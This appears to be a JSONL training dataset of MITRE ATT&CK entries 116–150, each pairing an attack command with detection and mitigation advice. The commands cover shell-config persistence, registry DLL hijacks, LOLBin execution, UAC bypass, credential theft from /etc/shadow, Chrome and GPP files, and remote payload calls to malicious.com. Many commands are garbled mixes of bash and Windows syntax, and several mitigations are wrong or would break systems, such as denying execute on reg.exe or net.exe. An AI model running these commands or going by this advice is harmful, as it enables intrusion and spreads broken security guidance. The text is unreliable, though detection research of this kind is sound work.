{"id":116,"tactic":"Persistence","technique":"T1546.005: Trap","threat":"Using trap command in zsh for persistence on Linux.","command":"echo 'trap \"zsh -c \\\"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\\\"\" INT' >> ~/.zshrc","detection":"Monitor zshrc trap commands: `cat ~/.zshrc | grep trap`; Audit file changes: `auditctl -w ~/.zshrc -p wa`.","mitigation":"Restrict zshrc writes: `chmod 600 ~/.zshrc`; Monitor trap configurations.","references":["MITRE ATT&CK T1546.005: https://attack.mitre.org/techniques/T1546/005/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect zsh trap tampering and suggest file protections."}
{"id":117,"tactic":"Privilege Escalation","technique":"T1548.005: Temporary Elevated Cloud Access","threat":"Abusing Azure CLI to escalate privileges via temporary credentials.","command":"az account get-access-token --resource $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo token$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).json)","detection":"Monitor Azure CLI: `wmic process where name='az.cmd' get commandline | findstr get-access-token`; Audit Azure logs: Azure Activity Logs.","mitigation":"Restrict Azure CLI: `icacls %userprofile%\\.azure /deny Everyone:RX`; Require MFA: Azure AD policies.","references":["MITRE ATT&CK T1548.005: https://attack.mitre.org/techniques/T1548/005/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect unauthorized Azure CLI token access and suggest MFA enforcement."}
{"id":118,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF file with obfuscated payload.","command":"cmstp /ni /s $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp: `wmic process where name='cmstp.exe' get commandline | findstr inf`; YARA rule: `rule CmstpInf { strings: $a = /cmstp.*inf/ nocase; condition: $a }`","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Disable INF execution: AppLocker.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp INF execution and suggest AppLocker policies."}
{"id":119,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse sdiagnhost.exe for diagnostic payload execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process sdiagnhost.exe -ArgumentList '-Embedding $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).ps1)'\"","detection":"Monitor sdiagnhost: `wmic process where name='sdiagnhost.exe' get commandline`; Event ID 4688.","mitigation":"Restrict sdiagnhost: `icacls %windir%\\System32\\sdiagnhost.exe /deny Everyone:RX`; Disable diagnostic services: `sc config sdiagnhost start= disabled`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect sdiagnhost abuse and suggest service restrictions."}
{"id":120,"tactic":"Persistence","technique":"T1546.014: Emond","threat":"Abusing emond on macOS to execute payload via custom rule.","command":"echo 'command=/bin/zsh -c \"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' > /etc/emond.d/rules/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).plist && launchctl load /etc/emond.d/rules/*","detection":"Monitor emond rules: `ls /etc/emond.d/rules`; Audit file changes: `auditctl -w /etc/emond.d -p wa`.","mitigation":"Restrict emond rules: `chmod 700 /etc/emond.d`; Disable emond: `launchctl unload /System/Library/LaunchDaemons/com.apple.emond.plist`.","references":["MITRE ATT&CK T1546.014: https://attack.mitre.org/techniques/T1546/014/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect emond rule tampering and suggest access controls."}
{"id":121,"tactic":"Credential Access","technique":"T1552.002: Credentials in Registry","threat":"Extracting credentials from registry using reg export.","command":"reg export HKLM\\Software\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).reg) /y","detection":"Monitor reg export: `wmic process where name='reg.exe' get commandline | findstr export`; Event ID 4663.","mitigation":"Restrict reg export: `icacls %windir%\\System32\\reg.exe /deny Everyone:RX`; Encrypt registry credentials: `reg add HKLM\\Software /v password /t REG_SZ /d (ConvertTo-SecureString 'pass' -AsPlainText -Force)`.","references":["MITRE ATT&CK T1552.002: https://attack.mitre.org/techniques/T1552/002/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect registry credential export and suggest encryption."}
{"id":122,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious DLL via driver configuration.","command":"odbcconf /S /A {CONFIGDRIVER \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"}","detection":"Monitor odbcconf driver: `wmic process where name='odbcconf.exe' get commandline | findstr CONFIGDRIVER`; Event ID 4688.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Disable driver configuration: AppLocker.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf driver execution and suggest AppLocker policies."}
{"id":123,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using wmic to execute malicious WMI method for code execution.","command":"wmic /NAMESPACE:\\\\root\\cimv2 PATH Win32_Process CALL Create \"powershell -c 'I$(echo malicious | base64 -w0)'\"","detection":"Monitor wmic process creation: `wmic process where name='wmic.exe' get commandline | findstr Win32_Process`; Event ID 4688.","mitigation":"Restrict wmic: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Disable WMI remote execution: `netsh advfirewall firewall add rule name='Block WMI' dir=out action=block service=winmgmt`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect wmic process creation and suggest access controls."}
{"id":124,"tactic":"Persistence","technique":"T1546.009: AppCert DLLs","threat":"Registering malicious AppCert DLL for persistence via registry.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\" /v $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /t REG_SZ /d \"C:\\Windows\\System32\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor AppCert DLLs: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Event ID 4657.","mitigation":"Restrict AppCert writes: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Session Manager\\AppCertDlls\"`; Enable DLL auditing.","references":["MITRE ATT&CK T1546.009: https://attack.mitre.org/techniques/T1546/009/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppCert DLL registrations and suggest registry protections."}
{"id":125,"tactic":"Privilege Escalation","technique":"T1548.001: Setuid and Setgid","threat":"Abusing setgid binary on Linux to escalate privileges.","command":"chmod g+s $(echo /tmp/evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) && $(echo /tmp/evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))","detection":"Monitor setgid changes: `find / -perm -2000`; Audit file changes: `auditctl -w /tmp -p wa`.","mitigation":"Remove unnecessary setgid: `chmod g-s /tmp/*`; Restrict setgid: `sysctl -w fs.protected_regular=1`.","references":["MITRE ATT&CK T1548.001: https://attack.mitre.org/techniques/T1548/001/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect setgid binary abuse and suggest file system protections."}
{"id":126,"tactic":"Defense Evasion","technique":"T1218.002: Control Panel","threat":"Using control.exe to execute malicious CPL file remotely.","command":"control /name $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).cpl) /remote http://malicious.com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)","detection":"Monitor control.exe network activity: `netstat -anp | grep control`; YARA rule: `rule ControlCPLRemote { strings: $a = /control.*http/ nocase; condition: $a }`","mitigation":"Block control.exe network access: `netsh advfirewall firewall add rule name='Block control' dir=out program='%windir%\\System32\\control.exe' action=block`; Use AppLocker for CPL files.","references":["MITRE ATT&CK T1218.002: https://attack.mitre.org/techniques/T1218/002/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect control.exe CPL remote execution and suggest firewall rules."}
{"id":127,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse tracert.exe for network-based payload execution.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Start-Process tracert.exe -ArgumentList '-h 1 $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)).malicious.com'\"","detection":"Monitor tracert: `wmic process where name='tracert.exe' get commandline | findstr malicious`; Event ID 4688.","mitigation":"Restrict tracert: `icacls %windir%\\System32\\tracert.exe /deny Everyone:RX`; Monitor DNS queries: `netsh advfirewall firewall add rule name='Log DNS' dir=out action=allow protocol=udp remoteport=53 enable=yes`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect tracert abuse and suggest DNS monitoring."}
{"id":128,"tactic":"Persistence","technique":"T1546.010: AppInit DLLs","threat":"Registering malicious AppInit DLL for persistence via HKCU.","command":"reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs /t REG_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)\"","detection":"Monitor AppInit: `reg query \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v AppInit_DLLs`; Event ID 4657.","mitigation":"Disable AppInit: `reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\" /v LoadAppInit_DLLs /t REG_DWORD /d 0`; Restrict registry writes.","references":["MITRE ATT&CK T1546.010: https://attack.mitre.org/techniques/T1546/010/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect AppInit DLL registrations in HKCU and suggest disabling AppInit."}
{"id":129,"tactic":"Credential Access","technique":"T1555.003: Credentials from Web Browsers","threat":"Extracting browser credentials using PowerShell from Chrome database.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; Get-Content $env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data | Select-String password > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor browser data access: `wmic process where name='powershell.exe' get commandline | findstr Chrome`; Event ID 4663.","mitigation":"Encrypt browser data: `reg add HKLM\\Software\\Policies\\Google\\Chrome /v PasswordManagerEnabled /t REG_DWORD /d 0`; Restrict file access: `icacls %localappdata%\\Google\\Chrome /deny Everyone:RX`.","references":["MITRE ATT&CK T1555.003: https://attack.mitre.org/techniques/T1555/003/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect Chrome credential extraction and suggest browser protections."}
{"id":130,"tactic":"Defense Evasion","technique":"T1218.013: Mavinject","threat":"Using mavinject.exe to inject malicious code into explorer.exe.","command":"mavinject $(tasklist | findstr /i explorer | awk '{print $2}') /INJECTRUNNING $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll)","detection":"Monitor mavinject: `wmic process where name='mavinject.exe' get commandline | findstr explorer`; Event ID 10 (Sysmon).","mitigation":"Restrict mavinject: `icacls %windir%\\System32\\mavinject.exe /deny Everyone:RX`; Monitor process injections: Sysmon Event ID 10.","references":["MITRE ATT&CK T1218.013: https://attack.mitre.org/techniques/T1218/013/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mavinject injections into explorer.exe and suggest access controls."}
{"id":131,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using netsh to execute malicious script via trace session.","command":"netsh trace start scenario=InternetClient capture=yes tracefile=$(echo trace$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).etl) && powershell -c 'I$(echo malicious | base64 -w0)'","detection":"Monitor netsh trace: `wmic process where name='netsh.exe' get commandline | findstr trace`; Event ID 4688.","mitigation":"Restrict netsh: `icacls %windir%\\System32\\netsh.exe /deny Everyone:RX`; Audit trace sessions: `netsh trace show scenarios`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect netsh trace abuse and suggest access controls."}
{"id":132,"tactic":"Persistence","technique":"T1546.001: Change Default File Association","threat":"Changing PDF file association to execute malicious program.","command":"assoc .pdf=$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor file associations: `assoc | findstr evil`; Event ID 4657.","mitigation":"Restrict assoc changes: `regini -h deny HKCR`; Audit registry changes: Event ID 4657.","references":["MITRE ATT&CK T1546.001: https://attack.mitre.org/techniques/T1546/001/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect PDF file association changes and suggest registry protections."}
{"id":133,"tactic":"Privilege Escalation","technique":"T1547.005: Security Support Provider","threat":"Registering malicious SSP via registry for credential capture.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages /t REG_MULTI_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\0kerberos\"","detection":"Monitor SSP changes: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Security Packages`; Event ID 4657.","mitigation":"Restrict SSP modifications: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\"`; Audit LSA changes.","references":["MITRE ATT&CK T1547.005: https://attack.mitre.org/techniques/T1547/005/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect SSP tampering and suggest LSA protections."}
{"id":134,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc.exe to execute malicious MSC file with obfuscated payload.","command":"mmc /s $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mmc: `wmic process where name='mmc.exe' get commandline | findstr msc`; YARA rule: `rule MmcMsc { strings: $a = /mmc.*msc/ nocase; condition: $a }`","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Disable MSC execution: AppLocker.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc MSC execution and suggest AppLocker policies."}
{"id":135,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse dsquery.exe for AD reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; dsquery user -name * -limit 0 | findstr $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo ad$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor dsquery: `wmic process where name='dsquery.exe' get commandline`; Event ID 4688.","mitigation":"Restrict dsquery: `icacls %windir%\\System32\\dsquery.exe /deny Everyone:RX`; Audit AD queries: Event ID 4662.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect dsquery AD reconnaissance and suggest access controls."}
{"id":136,"tactic":"Persistence","technique":"T1546.006: LC_LOAD_DYLIB Addition","threat":"Injecting malicious dylib into macOS binary for persistence.","command":"install_name_tool -add_rpath /tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib /Applications/$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8).app/Contents/MacOS/*","detection":"Monitor dylib changes: `otool -L /Applications/*`; Audit file changes: `auditctl -w /Applications -p wa`.","mitigation":"Restrict dylib modifications: `chmod 755 /Applications/*`; Enable SIP: `csrutil enable`.","references":["MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect dylib injections and suggest SIP enforcement."}
{"id":137,"tactic":"Credential Access","technique":"T1552.006: Group Policy Preferences","threat":"Extracting credentials from GPP XML files using findstr.","command":"findstr /s /i cpassword \\\\domain\\sysvol\\*.xml > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor GPP access: `net use | findstr sysvol`; Audit file access: Event ID 4663.","mitigation":"Remove GPP credentials: `gpedit.msc`; Restrict sysvol access: `icacls \\\\domain\\sysvol /deny Everyone:RX`.","references":["MITRE ATT&CK T1552.006: https://attack.mitre.org/techniques/T1552/006/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect GPP credential extraction and suggest sysvol protections."}
{"id":138,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute malicious CHM file with obfuscated payload.","command":"hh $(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor hh.exe: `wmic process where name='hh.exe' get commandline | findstr chm`; YARA rule: `rule HhChm { strings: $a = /hh.*chm/ nocase; condition: $a }`","mitigation":"Restrict hh.exe: `icacls %windir%\\hh.exe /deny Everyone:RX`; Disable CHM execution: AppLocker.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh.exe CHM execution and suggest AppLocker policies."}
{"id":139,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using net.exe to execute malicious share-based payload.","command":"net use \\\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\IPC$ /u:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) && cmd /c \\\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\$(echo share$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\$(echo payload$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor net use: `wmic process where name='net.exe' get commandline | findstr IPC`; Event ID 5140.","mitigation":"Restrict net.exe: `icacls %windir%\\System32\\net.exe /deny Everyone:RX`; Disable SMBv1: `Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect net.exe share execution and suggest SMB restrictions."}
{"id":140,"tactic":"Persistence","technique":"T1546.002: Screensaver","threat":"Using malicious screensaver with obfuscated payload for persistence.","command":"copy $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) %windir%\\System32 && reg add \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%windir%\\System32\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).scr) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor screensaver changes: `reg query \"HKCU\\Control Panel\\Desktop\" /v SCRNSAVE.EXE`; Event ID 4657.","mitigation":"Restrict screensaver writes: `icacls %windir%\\System32\\*.scr /deny Everyone:WX`; Disable screensavers: `reg add \"HKCU\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 0`.","references":["MITRE ATT&CK T1546.002: https://attack.mitre.org/techniques/T1546/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect malicious screensaver installations and suggest registry protections."}
{"id":141,"tactic":"Privilege Escalation","technique":"T1134.002: Create Process with Token","threat":"Using PowerShell to create process with stolen token for privilege escalation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; $token = [System.Security.Principal.WindowsIdentity]::GetCurrent().Token; Start-Process -Token $token cmd.exe -ArgumentList '/c I$(echo malicious | base64 -w0)'\"","detection":"Monitor token usage: `wmic process where name='powershell.exe' get commandline | findstr Token`; Event ID 4692.","mitigation":"Enable token auditing: `auditpol /set /category:'System' /subcategory:'Security System Extension' /success:enable`; Use EDR for token abuse detection.","references":["MITRE ATT&CK T1134.002: https://attack.mitre.org/techniques/T1134/002/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect token-based process creation and suggest auditing."}
{"id":142,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil.exe to execute malicious .NET binary with obfuscated payload.","command":"InstallUtil /logfile= /LogToConsole=false /U $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil: `wmic process where name='InstallUtil.exe' get commandline | findstr LogToConsole`; YARA rule: `rule InstallUtilObf { strings: $a = /InstallUtil.*LogToConsole/ nocase; condition: $a }`","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Use AppLocker for .NET binaries.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil obfuscated execution and suggest AppLocker policies."}
{"id":143,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse netstat.exe for network reconnaissance.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; netstat -ano | findstr :$(shuf -i 1000-65535 -n 1) > $(echo net$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)\"","detection":"Monitor netstat: `wmic process where name='netstat.exe' get commandline | findstr findstr`; Event ID 4688.","mitigation":"Restrict netstat: `icacls %windir%\\System32\\netstat.exe /deny Everyone:RX`; Monitor network activity: `netsh advfirewall firewall add rule name='Log Network' dir=out action=allow enable=yes`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect netstat reconnaissance and suggest network monitoring."}
{"id":144,"tactic":"Persistence","technique":"T1546.011: Application Shimming","threat":"Registering malicious shim database for persistence via sdbinst.","command":"sdbinst /q $(echo shim$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sdb)","detection":"Monitor sdbinst: `wmic process where name='sdbinst.exe' get commandline`; Event ID 4688.","mitigation":"Restrict sdbinst: `icacls %windir%\\System32\\sdbinst.exe /deny Everyone:RX`; Audit shim installations: `reg query HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Custom`.","references":["MITRE ATT&CK T1546.011: https://attack.mitre.org/techniques/T1546/011/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect shim database installations and suggest access controls."}
{"id":145,"tactic":"Credential Access","technique":"T1003.008: /etc/passwd and /etc/shadow","threat":"Extracting credentials from /etc/shadow using cat.","command":"cat /etc/shadow | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) > $(echo creds$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor shadow access: `ps aux | grep cat | grep shadow`; Audit file access: `auditctl -w /etc/shadow -p r`.","mitigation":"Restrict shadow access: `chmod 600 /etc/shadow`; Enable file auditing: `auditctl -w /etc/shadow -p wa`.","references":["MITRE ATT&CK T1003.008: https://attack.mitre.org/techniques/T1003/008/","CWE-522: https://cwe.mitre.org/data/definitions/522.html"],"ai_training_prompt":"Train AI to detect shadow file access and suggest file protections."}
{"id":146,"tactic":"Defense Evasion","technique":"T1218.012: Verclsid","threat":"Using verclsid.exe to validate malicious COM object with obfuscated payload.","command":"verclsid /S /C {$(uuidgen)} /I $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor verclsid: `wmic process where name='verclsid.exe' get commandline | findstr dll`; YARA rule: `rule VerclsidDll { strings: $a = /verclsid.*dll/ nocase; condition: $a }`","mitigation":"Restrict verclsid: `icacls %windir%\\System32\\verclsid.exe /deny Everyone:RX`; Audit COM objects: `reg query HKCR\\CLSID`.","references":["MITRE ATT&CK T1218.012: https://attack.mitre.org/techniques/T1218/012/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect verclsid COM validation and suggest access controls."}
{"id":147,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using schtasks to execute malicious task with obfuscated payload.","command":"schtasks /create /tn $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /tr \"cmd /c powershell -c 'I$(echo malicious | base64 -w0)'\" /sc onlogon /ru SYSTEM /f","detection":"Monitor schtasks: `schtasks /query | findstr $(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)`; Event ID 4698.","mitigation":"Restrict schtasks: `icacls %windir%\\System32\\schtasks.exe /deny Everyone:RX`; Audit task creation: Event ID 4698.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect schtasks malicious task creation and suggest access controls."}
{"id":148,"tactic":"Persistence","technique":"T1546.004: Unix Shell Configuration Modification","threat":"Injecting malicious code into cshrc for persistence on Linux.","command":"echo 'csh -c \"$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh\"' >> ~/.cshrc","detection":"Monitor cshrc changes: `cat ~/.cshrc | grep csh`; Audit file changes: `auditctl -w ~/.cshrc -p wa`.","mitigation":"Restrict cshrc writes: `chmod 600 ~/.cshrc`; Monitor shell configuration changes.","references":["MITRE ATT&CK T1546.004: https://attack.mitre.org/techniques/T1546/004/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect cshrc tampering and suggest file protections."}
{"id":149,"tactic":"Privilege Escalation","technique":"T1548.002: Bypass User Account Control","threat":"Bypassing UAC using compmgmtlauncher.exe for elevated execution.","command":"compmgmtlauncher && powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; I$(echo 'malicious' | base64 -w0)\"","detection":"Monitor compmgmtlauncher: `wmic process where name='compmgmtlauncher.exe' get commandline`; Event ID 4688.","mitigation":"Enable UAC: `reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 1`; Restrict compmgmtlauncher: `icacls %windir%\\System32\\compmgmtlauncher.exe /deny Everyone:RX`.","references":["MITRE ATT&CK T1548.002: https://attack.mitre.org/techniques/T1548/002/","CWE-269: https://cwe.mitre.org/data/definitions/269.html"],"ai_training_prompt":"Train AI to detect UAC bypass via compmgmtlauncher and suggest UAC enforcement."}
{"id":150,"tactic":"Defense Evasion","technique":"T1218.011: Rundll32","threat":"Using rundll32 to execute malicious payload via shdocvw.dll.","command":"rundll32 shdocvw.dll,OpenURL \"$(echo malicious$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).html) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor rundll32 shdocvw: `wmic process where name='rundll32.exe' get commandline | findstr shdocvw`; YARA rule: `rule Rundll32Shdocvw { strings: $a = /rundll32.*shdocvw/ nocase; condition: $a }`","mitigation":"Restrict rundll32: `icacls %windir%\\System32\\rundll32.exe /deny Everyone:RX`; Use AppLocker to block shdocvw execution.","references":["MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect rundll32 shdocvw execution and suggest AppLocker policies."}
